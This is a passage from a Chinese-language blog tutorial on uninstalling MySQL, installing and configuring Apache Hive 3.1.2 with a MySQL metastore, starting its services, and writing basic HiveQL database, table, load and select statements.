class="language-bash">关闭mysql服务</span><br>systemctl stop mysqld.service<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查找安装mysql的rpm包</span><br>[root@node3 ~]# rpm -qa | grep -i mysql    <br>mysql-community-libs-5.7.29-1.el7.x86_64<br>mysql-community-common-5.7.29-1.el7.x86_64<br>mysql-community-client-5.7.29-1.el7.x86_64<br>mysql-community-server-5.7.29-1.el7.x86_64<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">卸载</span><br>[root@node3 ~]# yum remove mysql-community-libs-5.7.29-1.el7.x86_64 mysql-community-common-5.7.29-1.el7.x86_64 mysql-community-client-5.7.29-1.el7.x86_64 mysql-community-server-5.7.29-1.el7.x86_64<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查看是否卸载干净</span><br>rpm -qa | grep -i mysql<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">查找mysql相关目录 删除</span><br>[root@node1 ~]# find / -name mysql<br>/var/lib/mysql<br>/var/lib/mysql/mysql<br>/usr/share/mysql<br><br>[root@node1 ~]# rm -rf /var/lib/mysql<br>[root@node1 ~]# rm -rf /var/lib/mysql/mysql<br>[root@node1 ~]# rm -rf /usr/share/mysql<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">删除默认配置 日志</span><br>rm -rf /etc/my.cnf<br>rm -rf /var/log/mysqld.log<br></code></pre></td></tr></table></figure><h2 id="2-安装Hive"><a href="#2-安装Hive" class="headerlink" title="2. 安装Hive"></a>2. 安装Hive</h2><h3 id="2-1-上传安装包"><a href="#2-1-上传安装包" class="headerlink" title="2.1 上传安装包"></a>2.1 上传安装包</h3><p>上传Hive安装包到【/export/server/】目录下，然后解压</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /export/server/<br>tar zxvf apache-hive-3.1.2-bin.tar.gz<br></code></pre></td></tr></table></figure><p>解决Hive与Hadoop之间guava版本差异</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /export/server/apache-hive-3.1.2-bin/<br><span class="hljs-built_in">rm</span> -f lib/guava-19.0.jar<br><span class="hljs-built_in">cp</span> /export/server/hadoop-3.3.0/share/hadoop/common/lib/guava-27.0-jre.jar ./lib/<br></code></pre></td></tr></table></figure><h3 id="2-2-修改配置文件"><a href="#2-2-修改配置文件" class="headerlink" title="2.2 修改配置文件"></a>2.2 修改配置文件</h3><ul><li><p>hive-env.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /export/server/apache-hive-3.1.2-bin/conf<br><span class="hljs-built_in">mv</span> hive-env.sh.template hive-env.sh<br>vim hive-env.sh<br></code></pre></td></tr></table></figure><p>结尾追加</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">export</span> HADOOP_HOME=/export/server/hadoop-3.3.0<br><span class="hljs-built_in">export</span> HIVE_CONF_DIR=/export/server/apache-hive-3.1.2-bin/conf<br><span class="hljs-built_in">export</span> HIVE_AUX_JARS_PATH=/export/server/apache-hive-3.1.2-bin/lib<br></code></pre></td></tr></table></figure></li><li><p>hive-site.xml</p><p>直接vim打开新文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">vim hive-site.xml<br></code></pre></td></tr></table></figure><p>编辑如下</p></li></ul><details><summary>点击展开配置内容</summary>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br><span class="hljs-comment">&lt;!-- 存储元数据mysql相关配置 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>javax.jdo.option.ConnectionURL<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>jdbc:mysql://node1:3306/hive3?createDatabaseIfNotExist=true<span class="hljs-symbol">&amp;amp;</span>useSSL=false<span class="hljs-symbol">&amp;amp;</span>useUnicode=true<span class="hljs-symbol">&amp;amp;</span>characterEncoding=UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>javax.jdo.option.ConnectionDriverName<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>com.mysql.jdbc.Driver<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>javax.jdo.option.ConnectionUserName<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>root<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>javax.jdo.option.ConnectionPassword<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>hadoop<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- H2S运行绑定host --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hive.server2.thrift.bind.host<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>node1<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 远程模式部署metastore metastore地址 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hive.metastore.uris<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>thrift://node1:9083<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><br><span class="hljs-comment">&lt;!-- 关闭元数据存储授权  --&gt;</span> <br><span class="hljs-tag">&lt;<span class="hljs-name">property</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>hive.metastore.event.db.notification.api.auth<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">property</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br></code></pre></td></tr></table></figure></details><h3 id="2-3-上传驱动"><a href="#2-3-上传驱动" class="headerlink" title="2.3 上传驱动"></a>2.3 上传驱动</h3><p>上传MySQL jdbc驱动到Hive安装包lib下</p><img src="/2022/01/newpost-29/image-20220112162512172.png" class="" title="image-20220112162512172"><h3 id="2-4-初始化元数据"><a href="#2-4-初始化元数据" class="headerlink" title="2.4 初始化元数据"></a>2.4 初始化元数据</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">cd</span> /export/server/apache-hive-3.1.2-bin/<br>bin/schematool -initSchema -dbType mysql -verbos<br><span class="hljs-comment">#初始化成功会在mysql中创建74张表</span><br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-29/image-20220112165243736.png" class="" title="image-20220112165243736"><h3 id="2-5-解决注释信息中文乱码"><a href="#2-5-解决注释信息中文乱码" class="headerlink" title="2.5 解决注释信息中文乱码"></a>2.5 解决注释信息中文乱码</h3><p><strong>MySQL</strong>中执行以下语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">use hive3;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> hive3.COLUMNS_V2 modify <span class="hljs-keyword">column</span> COMMENT <span class="hljs-type">varchar</span>(<span class="hljs-number">256</span>) <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> hive3.TABLE_PARAMS modify <span class="hljs-keyword">column</span> PARAM_VALUE <span class="hljs-type">varchar</span>(<span class="hljs-number">4000</span>) <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> hive3.PARTITION_PARAMS modify <span class="hljs-keyword">column</span> PARAM_VALUE <span class="hljs-type">varchar</span>(<span class="hljs-number">4000</span>) <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> hive3.PARTITION_KEYS modify <span class="hljs-keyword">column</span> PKEY_COMMENT <span class="hljs-type">varchar</span>(<span class="hljs-number">4000</span>) <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> hive3.INDEX_PARAMS modify <span class="hljs-keyword">column</span> PARAM_VALUE <span class="hljs-type">varchar</span>(<span class="hljs-number">4000</span>) <span class="hljs-type">character</span> <span class="hljs-keyword">set</span> utf8;<br></code></pre></td></tr></table></figure><h3 id="2-6-创建Hive存储目录"><a href="#2-6-创建Hive存储目录" class="headerlink" title="2.6 创建Hive存储目录"></a>2.6 创建Hive存储目录</h3><p>在HDFS创建Hive存储目录（如存在则不用操作）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">hadoop fs -<span class="hljs-built_in">mkdir</span> /tmp<br>hadoop fs -<span class="hljs-built_in">mkdir</span> -p /user/hive/warehouse<br>hadoop fs -<span class="hljs-built_in">chmod</span> g+w /tmp<br>hadoop fs -<span class="hljs-built_in">chmod</span> g+w /user/hive/warehouse<br></code></pre></td></tr></table></figure><h1 id="三、-使用"><a href="#三、-使用" class="headerlink" title="三、 使用"></a>三、 使用</h1><h2 id="1-启动Hive"><a href="#1-启动Hive" class="headerlink" title="1. 启动Hive"></a>1. 启动Hive</h2><h3 id="1-1-启动metastore服务"><a href="#1-1-启动metastore服务" class="headerlink" title="1.1 启动metastore服务"></a>1.1 启动metastore服务</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-comment">#前台启动  关闭ctrl+c</span><br>/export/server/apache-hive-3.1.2-bin/bin/hive --service metastore<br><br><span class="hljs-comment">#前台启动开启debug日志</span><br>/export/server/apache-hive-3.1.2-bin/bin/hive --service metastore --hiveconf hive.root.logger=DEBUG,console  <br><span class="hljs-comment">#后台启动 进程挂起  关闭使用jps+ kill -9</span><br><span class="hljs-built_in">nohup</span> /export/server/apache-hive-3.1.2-bin/bin/hive --service metastore &amp;<br></code></pre></td></tr></table></figure><h3 id="1-2-启动hiveserver2服务"><a href="#1-2-启动hiveserver2服务" class="headerlink" title="1.2 启动hiveserver2服务"></a>1.2 启动hiveserver2服务</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">nohup</span> /export/server/apache-hive-3.1.2-bin/bin/hive --service hiveserver2 &amp;<br><span class="hljs-comment">#注意 启动hiveserver2需要一定的时间  不要启动之后立即beeline连接 可能连接不上</span><br></code></pre></td></tr></table></figure><h2 id="2-beeline客户端连接"><a href="#2-beeline客户端连接" class="headerlink" title="2. beeline客户端连接"></a>2. beeline客户端连接</h2><p>拷贝node1安装包到node3上</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">scp -r /export/server/apache-hive-3.1.2-bin/ node3:/export/server/<br></code></pre></td></tr></table></figure><p>连接</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sh">/export/server/apache-hive-3.1.2-bin/bin/beeline<br><br>beeline&gt; ! connect jdbc:hive2://node1:10000<br>beeline&gt; root<br>beeline&gt; 直接回车<br></code></pre></td></tr></table></figure><h2 id="3-DataGrip连接Hive（略）"><a href="#3-DataGrip连接Hive（略）" class="headerlink" title="3. DataGrip连接Hive（略）"></a>3. DataGrip连接Hive（略）</h2><h2 id="4-库表语法"><a href="#4-库表语法" class="headerlink" title="4. 库表语法"></a>4. 库表语法</h2><h3 id="4-1-库"><a href="#4-1-库" class="headerlink" title="4.1 库"></a>4.1 库</h3><ul><li><p>查看库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> databases;<br></code></pre></td></tr></table></figure></li><li><p>创建库</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database [if <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span>] ifnxs [comment &quot;库描述&quot;] [<span class="hljs-keyword">with</span> dbproperties (<span class="hljs-string">&#x27;createdBy&#x27;</span><span class="hljs-operator">=</span><span class="hljs-string">&#x27;dr34m&#x27;</span>)];<br></code></pre></td></tr></table></figure><ul><li><p>with dbproperties 用于指定一些数据库的属性配置</p></li><li><p>location 可以指定数据库在HDFS存储位置，默认/user/hive/warehouse/dbname.db</p></li><li><p>例</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> database test;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>使用库</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">use ifnxs;<br></code></pre></td></tr></table></figure></li><li><p>删除库</p>  <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">drop</span> database [if <span class="hljs-keyword">exists</span>] test [cascade];<br></code></pre></td></tr></table></figure><ul><li>cascade表示强制删除，默认为restrict，这意味着仅在数据库为空时才删除它</li></ul></li></ul><h3 id="4-2-表"><a href="#4-2-表" class="headerlink" title="4.2 表"></a>4.2 表</h3><ul><li><p>查看表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> tables [<span class="hljs-keyword">in</span> xxx];<br></code></pre></td></tr></table></figure></li><li><p>创建表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> [if <span class="hljs-keyword">not</span> <span class="hljs-keyword">exists</span>] [xxx.]zzz (col_name data_type [comment &quot;字段描述&quot;], ...)<br>[comment &quot;表描述&quot;]<br>[<span class="hljs-type">row</span> format delimited ...];<br></code></pre></td></tr></table></figure><ul><li><p>数据类型</p><ul><li>最常用<code>string</code>和<code>int</code></li><li><img src="/2022/01/newpost-29/image-20220113103149295.png" class="" title="image-20220113103149295"></li></ul></li><li><p>分隔符</p><img src="/2022/01/newpost-29/image-20220113103334700.png" class="" title="image-20220113103334700"></li><li><p>例</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> ifnxs.t_user (<br>    id <span class="hljs-type">int</span> comment &quot;编号&quot;,<br>    name string comment &quot;姓名&quot;<br>) comment &quot;用户表&quot;<br><span class="hljs-type">row</span> format delimited<br>fields terminated <span class="hljs-keyword">by</span> &quot;\t&quot;; <span class="hljs-comment">-- 字段之间的分隔符</span><br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-29/image-20220113104838039.png" class="" title="image-20220113104838039"></li><li><p>从select创建表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> xxx <span class="hljs-keyword">as</span> <span class="hljs-keyword">select</span> id,name <span class="hljs-keyword">from</span> ifnxs.t_user;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>查看表结构</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">desc</span> formatted xxx;<br></code></pre></td></tr></table></figure></li></ul><ul><li><p>删除表</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">drop</span> <span class="hljs-keyword">table</span> [if <span class="hljs-keyword">exists</span>] xxx;<br></code></pre></td></tr></table></figure></li></ul><h2 id="5-DML语法与函数"><a href="#5-DML语法与函数" class="headerlink" title="5. DML语法与函数"></a>5. DML语法与函数</h2><h3 id="5-1-Load语法规则"><a href="#5-1-Load语法规则" class="headerlink" title="5.1 Load语法规则"></a>5.1 Load语法规则</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">LOAD DATA [<span class="hljs-keyword">LOCAL</span>] INPATH <span class="hljs-string">&#x27;filepath&#x27;</span> [OVERWRITE] <span class="hljs-keyword">INTO</span> <span class="hljs-keyword">TABLE</span> tablename;<br></code></pre></td></tr></table></figure><ul><li><p><strong>LOCAL指Hiveserver2服务所在机器的本地Linux文件系统</strong></p></li><li><p>例-本地（复制操作）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">load data <span class="hljs-keyword">local</span> inpath <span class="hljs-string">&#x27;/root/hivedata/students.txt&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> itheima.student_local;<br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-29/image-20220113151519305.png" class="" title="image-20220113151519305"></li><li><p>例-HDFS（移动操作）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">load data inpath <span class="hljs-string">&#x27;/students.txt&#x27;</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">table</span> itheima.student_hdfs;<br></code></pre></td></tr></table></figure><img src="/2022/01/newpost-29/image-20220113151905792.png" class="" title="image-20220113151905792"></li></ul><h3 id="5-2-Insert语法"><a href="#5-2-Insert语法" class="headerlink" title="5.2 Insert语法"></a>5.2 Insert语法</h3><p>Hive推荐<strong>清洗数据成为结构化文件，再使用Load语法加载数据到表中</strong></p><h4 id="insert-select例"><a href="#insert-select例" class="headerlink" title="insert+select例"></a>insert+select例</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">select</span> id,name <span class="hljs-keyword">from</span> student;<br></code></pre></td></tr></table></figure><h3 id="5-3-select语法"><a href="#5-3-select语法" class="headerlink" title="5.3 select语法"></a>5.3 select语法</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> [<span class="hljs-keyword">ALL</span><span class="hljs-operator">|</span><span class="hljs-keyword">DISTINCT</span>] select_expr, select_expr, ...<br><span class="hljs-keyword">FROM</span> table_reference<br>[<span class="hljs-keyword">WHERE</span> where_condition]<br>[<span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">BY</span> col_list]<br>[<span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> col_list]<br>[LIMIT [<span class="hljs-keyword">offset</span>,] <span class="hljs-keyword">rows</span>];<br></code></pre></td></tr></table></figure><ul><li>例</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 查询所有字段或者指定字段</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19;<br><span class="hljs-keyword">select</span> county, cases, deaths <span class="hljs-keyword">from</span> t_usa_covid19;<br><br><span class="hljs-comment">-- 查询常数返回 此时返回的结果和表中字段无关</span><br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> t_usa_covid19;<br><br><span class="hljs-comment">-- 查询当前所属数据库</span><br><span class="hljs-keyword">select</span> current_database(); <span class="hljs-comment">-- 省去from关键字</span><br><br><span class="hljs-comment">-- 返回所有匹配的行 去除重复的结果</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> state <span class="hljs-keyword">from</span> t_usa_covid19;<br><br><span class="hljs-comment">-- 多个字段distinct 整体去重</span><br><span class="hljs-keyword">select</span> <span class="hljs-keyword">distinct</span> county,state <span class="hljs-keyword">from</span> t_usa_covid19;<br></code></pre></td></tr></table></figure><h4 id="5-3-1-where条件"><a href="#5-3-1-where条件" class="headerlink" title="5.3.1 where条件"></a>5.3.1 where条件</h4><ul><li><p>比较运算符 <code>=</code> <code>&gt;</code> <code>&lt;</code> <code>&lt;=</code> <code>&gt;=</code> <code>!=</code> <code>&lt;&gt;</code>(不等于)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 找出来自于California州的疫情数据</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> state <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;California&#x27;</span>;<br><br><span class="hljs-comment">-- where条件中使用函数 找出州名字母长度超过10位的有哪些</span><br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> length(state) <span class="hljs-operator">&gt;</span><span class="hljs-number">10</span>;<br></code></pre></td></tr></table></figure></li><li><p>逻辑运算 <code>and</code> <code>or</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> length(state)<span class="hljs-operator">&gt;</span><span class="hljs-number">10</span> <span class="hljs-keyword">and</span> length(state)<span class="hljs-operator">&lt;</span><span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure></li><li><p>空值判断 <code>is null</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> fips <span class="hljs-keyword">is</span> <span class="hljs-keyword">null</span>;<br></code></pre></td></tr></table></figure></li><li><p><code>between...and</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> length(state) <span class="hljs-keyword">between</span> <span class="hljs-number">10</span> <span class="hljs-keyword">and</span> <span class="hljs-number">20</span>;<br></code></pre></td></tr></table></figure></li><li><p><code>in</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> length(state) <span class="hljs-keyword">in</span> (<span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">13</span>);<br></code></pre></td></tr></table></figure></li></ul><h4 id="5-3-2-聚合操作"><a href="#5-3-2-聚合操作" class="headerlink" title="5.3.2 聚合操作"></a>5.3.2 聚合操作</h4><p><code>count</code> <code>sum</code> <code>max</code> <code>min</code> <code>avg</code></p><img src="/2022/01/newpost-29/image-20220113164306974.png" class="" title="image-20220113164306974"><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 统计美国总共有多少个县county</span><br><span class="hljs-comment">-- 学会使用as 给查询返回的结果起个别名</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(county) <span class="hljs-keyword">as</span> county_cnts <span class="hljs-keyword">from</span> t_usa_covid19;<br><br><span class="hljs-comment">-- 去重distinct</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-keyword">distinct</span> county) <span class="hljs-keyword">as</span> county_cnts <span class="hljs-keyword">from</span> t_usa_covid19;<br><br><span class="hljs-comment">-- 统计美国加州有多少个县</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(county) <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> state <span class="hljs-operator">=</span> &quot;California&quot;;<br><br><span class="hljs-comment">-- 统计德州总死亡病例数</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">sum</span>(deaths) <span class="hljs-keyword">from</span> t_usa_covid19 <span class="hljs-keyword">where</span> state <span class="hljs-operator">=</span> &quot;Texas&quot;;<br><br><span class="hljs-comment">-- 统计出美国最高确诊病例数是哪个县</span><br><span class="hljs-keyword">select</span> <span class="hljs-built_in">max</span>(cases) 